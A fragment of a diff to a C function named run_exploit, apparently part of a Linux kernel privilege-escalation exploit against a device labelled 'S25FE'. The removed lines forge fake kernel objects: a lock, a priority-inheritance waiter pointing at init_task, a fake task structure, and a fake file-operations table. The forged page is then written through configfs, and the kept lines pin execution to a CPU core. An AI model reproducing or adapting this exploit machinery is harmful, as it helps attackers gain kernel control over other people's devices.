@@ -481,54 +481,6 @@ int run_exploit(int argc, char **argv) {
     pr_error("S25FE: no page available\n");
     return 1;
   }
-
-      /* Lock structure */
-      put32(p, LOCK_OFF + 0x00, 0);
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
-
-      /* Waiter */
-      put_fake_waiter(p, W0_OFF, 1, 0, 0, fake_parent, fake_right, fake_left,
-                      text_addr(INIT_TASK), fake_lock, FAKE_WAITER_PRIO);
-
-      /* Task */
-      put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
-      put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
-      put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
-      put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, text_addr(ROOT_TASK_GROUP));
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, text_addr(INIT_TASK));
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
-
-      /* Fops table */
-      put_fake_fops_table(p, FOPS_TABLE_OFF);
-
-            /* Write page in 4KB chunks to avoid EINVAL */
-      int init_ok = 1;
-      for (size_t off = 0; off < ORDER3_SIZE; off += 4096) {
-        size_t chunk = (off + 4096 > ORDER3_SIZE) ? (ORDER3_SIZE - off) : 4096;
-        ssize_t wr = kernel_write_data(fd, page_base + off, p + off, chunk);
-        if (wr != (ssize_t)chunk) {
-          pr_error("S25FE: chunk off=%zu ret=%zd errno=%d\n", off, wr, errno);
-          init_ok = 0;
-          break;
-        }
-      }
-      if (init_ok) {
-        pr_success("S25FE: initialized fake page via configfs\n");
-      }
-      close(fd);
-    }
-    pr_info("S25FE: reusing slide page base=%016zx lock=%016zx fops=%016zx\n",
-            page_base, fake_lock, fake_fops);
-  } else {
-    pr_error("S25FE: no slide page to reuse\n");
-    return 1;
-  }
-
   pin_to_core(CORE);
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
